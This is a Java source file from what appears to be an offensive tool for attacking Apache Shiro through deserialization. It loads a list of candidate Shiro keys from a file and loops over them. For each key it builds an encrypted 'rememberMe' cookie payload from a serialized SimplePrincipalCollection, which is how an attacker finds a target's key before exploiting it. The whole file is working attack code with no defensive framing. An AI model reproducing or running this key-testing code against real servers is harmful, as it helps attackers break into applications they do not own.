package com.summersec.attack.deser.plugins.keytest;
import com.summersec.attack.deser.frame.Shiro;

import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.subject.SimplePrincipalCollection;

public class KeyEcho {
    public KeyEcho() {
    }

    public static Object getObject() {
        return new SimplePrincipalCollection();
    }

    public static void main(String[] args) throws Exception {
        Object keyObject = getObject();
        List<String> shiroKeys = new ArrayList();
        String cwd = System.getProperty("user.dir");
        List<String> array = new ArrayList(Arrays.asList(cwd, "resources", "shiro_keys.txt"));
        File shiro_file = new File(StringUtils.join(array, File.separator));
        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));

        try {
            String line;
            try {
                while((line = br.readLine()) != null) {
                    shiroKeys.add(line);
                }
            } catch (IOException var15) {
                var15.printStackTrace();
            }
        } finally {
            if (br != null) {
                br.close();
            }

        }

        Shiro shiro = new Shiro();

        for(int i = 0; i < shiroKeys.size(); ++i) {
            String shirokey = (String)shiroKeys.get(i);

            try {
                String sendpayload = shiro.sendpayload(keyObject, "rememberMe", shirokey);
                System.out.println(shiro.sendpayload(sendpayload, "rememberMe", shirokey));
            } catch (Exception var14) {
                System.out.println("[x] " + var14.getMessage());
            }
        }

    }
}


